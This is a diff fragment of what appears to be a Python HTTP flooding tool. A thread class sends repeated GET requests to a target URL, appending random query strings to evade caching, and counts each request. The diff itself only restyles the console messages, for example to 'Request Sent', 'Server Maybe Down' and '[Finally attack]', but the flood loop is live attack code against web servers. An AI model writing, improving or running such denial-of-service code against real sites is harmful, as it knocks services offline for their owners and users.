@@ -74,13 +74,13 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("[*]  \033[31mN0ZZ --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )  
-                print("[*]  \033[31mN0ZZ --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )      
+                print("[⟨⟩]\033[36m ▒\033[31m " +str(u)+ "▒ \033[37mRequest Sent ▒ \033[34m " +url+ "▒=⟩ \033[0m" )  
+                print("[⟨⟩]\033[31m▒ \033[32m " +str(u)+ " ▒\033[37mRequest Send\033[93m▒\033[34m " +url+ "▒\033[0m" )      
             except requests.exceptions.ConnectionError:
-                print("[*]  \033[1mN0ZZ --> \033[1m " +str(u)+ "   \033[97mSend the packet  \033[35m " +url+ "\033[0m" )
+                print("▒ ▒ ▒\033[1mServer \033[4mMaybe\033[97m ▒ ▒ ▒ \033[35mDown ▒ ▒ \033[0m" )
                 pass
             except requests.exceptions.InvalidSchema:
-                print ("[URL Error]")
+                print ("[Finally attack]")
                 raise SystemExit()
             except ValueError:
                 print ("[Check Your URL]")
